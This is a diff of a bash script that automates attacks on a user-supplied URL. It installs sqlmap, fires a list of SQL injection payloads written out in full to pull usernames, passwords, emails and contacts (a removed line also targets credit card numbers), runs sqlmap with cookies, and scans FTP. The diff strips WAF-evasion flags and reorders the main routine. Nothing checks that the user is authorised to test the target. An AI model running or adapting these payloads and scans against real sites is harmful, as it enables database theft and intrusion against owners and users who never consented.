@@ -23,12 +23,8 @@ save_to_file() {
 # Function to install necessary tools if not already installed
 install_tools() {
     declare -A tools=(
-        ["uniscan"]="uniscan"
-        ["nmap"]="nmap"
+        ["curl"]="curl"
         ["sqlmap"]="sqlmap"
-        ["whois"]="whois"
-        ["subfinder"]="subfinder"
-        ["seclists"]="seclists"
     )
     
     for tool in "${!tools[@]}"; do
@@ -91,7 +87,6 @@ perform_sql_injection() {
         "' OR 1=1 UNION SELECT NULL, NULL, NULL --"
         "' OR 1=1 UNION SELECT username, password FROM users --"
         "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --"
-        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --"
         "' OR 1=1 UNION SELECT email FROM users --"
         "' OR 1=1 UNION SELECT password FROM users --"
         "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
@@ -159,9 +154,9 @@ perform_sqlmap_scan() {
     for command in "${commands[@]}"; do
         local result
         if [ -z "$cookies" ]; then
-            result=$(run_command sqlmap -u "$target_url" $command --random-agent --tamper=between --identify-waf)
+            result=$(run_command sqlmap -u "$target_url" $command)
         else
-            result=$(run_command sqlmap -u "$target_url" --cookie="$cookies" $command --random-agent --tamper=between --identify-waf)
+            result=$(run_command sqlmap -u "$target_url" --cookie="$cookies" $command)
         fi
         local output_file="$results_dir/sqlmap_scan_${file_count}.txt"
         save_to_file "$output_file" "$result"
@@ -190,41 +185,38 @@ access_seclists() {
 
 # Main function to orchestrate the security scans
 main() {
+    # Install necessary tools
     install_tools
     
-    # Clear the screen and print the header
-    clear_screen
+    # Print the animated header
     print_header
     
-    # Check if the website is accessible
-    read -p "Enter the target URL: " target_url
-    if ! check_website_status "$target_url"; then
-        echo "Exiting script. Please ensure the website is accessible and try again."
-        exit 1
-    fi
+    # Clear the screen
+    clear_screen
     
-    # Create a directory to save results
-    local results_dir="scan_results"
+    # Get the target URL from the user
+    read -p "Enter the target URL: " target_url
+    
+    # Create a results directory
+    local results_dir="./results"
     mkdir -p "$results_dir"
     
-    # Perform SQL Injection
-    echo "Performing SQL Injection..."
-    perform_sql_injection "$target_url" "$results_dir"
-    
-    # Perform SQLmap scan
-    echo "Performing SQLmap scan..."
-    perform_sqlmap_scan "$target_url" "$results_dir"
-    
-    # Perform FTP scan
-    echo "Performing FTP scan..."
-    perform_ftp_scan "$target_url" "$results_dir"
-    
-    # Access Seclists database
-        # Access Seclists database
-    echo "Accessing Seclists database..."
-    access_seclists
-    
-    echo "Security scans completed. Results have been saved in the $results_dir directory."
+    # Check if the website is accessible
+    if check_website_status "$target_url"; then
+        echo "Starting SQL Injection attempts..."
+        perform_sql_injection "$target_url" "$results_dir"
+        
+        echo "Starting SQLmap scan..."
+        perform_sqlmap_scan "$target_url" "$results_dir"
+        
+        echo "Starting FTP scan..."
+        perform_ftp_scan "$target_url" "$results_dir"
+        
+        echo "Accessing Seclists database..."
+        access_seclists
+    else
+        echo "The website is not accessible. Exiting..."
+    fi
 }
 
 # Run the main function
